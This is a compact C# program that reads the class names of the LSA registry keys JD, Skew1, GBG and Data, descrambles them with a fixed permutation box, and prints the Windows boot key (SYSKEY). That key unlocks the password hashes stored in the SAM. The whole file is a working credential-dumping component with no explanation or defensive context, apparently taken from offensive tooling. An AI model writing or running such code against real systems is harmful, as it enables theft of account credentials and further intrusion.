using System;
using Microsoft.Win32;
using System.Net;
using System.Collections;
using System.Collections.Specialized;
using System.Collections.Generic;
using System.Security;
using System.Security.Cryptography;
using System.Security.Permissions;
using System.Text;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
class a{static void Main(){
string[] keys={"JD","Skew1","GBG","Data"};
string key="";
foreach(string s in keys)
{
IntPtr hkey=IntPtr.Zero;
RegOpenKeyEx(0x80000002,@"SYSTEM\CurrentControlSet\Control\Lsa\"+s,0,0x19,out hkey);
StringBuilder sb=new StringBuilder(64);
int len=64;
RegQueryInfoKey(hkey,sb,ref len,0,out len,out len,out len,out len,out len,out len,out len,IntPtr.Zero);
key+=sb.ToString();
RegCloseKey(hkey);
}
byte[] b=new byte[16];
byte[] tmp=new byte[16];
int[] box={0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7};
for(int i=0;i<16;i++){b[i]=Convert.ToByte(key.Substring(i*2,2),16);}
for(int i=0;i<16;i++){tmp[i]=b[box[i]];}
for(int i=0;i<16;i++){Console.Write(tmp[i].ToString("x2"));}Console.WriteLine();
}
[DllImport("advapi32.dll", CallingConvention=CallingConvention.Winapi, SetLastError=true)]
static extern int RegQueryInfoKey(IntPtr hkey,StringBuilder lpClass,ref int lpcbClass,int lpReserved,out int lpcSubKeys,out int lpcbMaxSubKeyLen,out int lpcbMaxClassLen,out int lpcValues,out int lpcbMaxValueNameLen,out int lpcbMaxValueLen,out int lpcbSecurityDescriptor,IntPtr lpftLastWriteTime);
[DllImport("advapi32.dll", SetLastError=true)]
static extern int RegCloseKey(IntPtr hKey);
[DllImport("advapi32.dll", CharSet = CharSet.Unicode)]
static extern int RegOpenKeyEx(uint hKey,string subKey,int ulOptions,int samDesired,out IntPtr hkResult);
}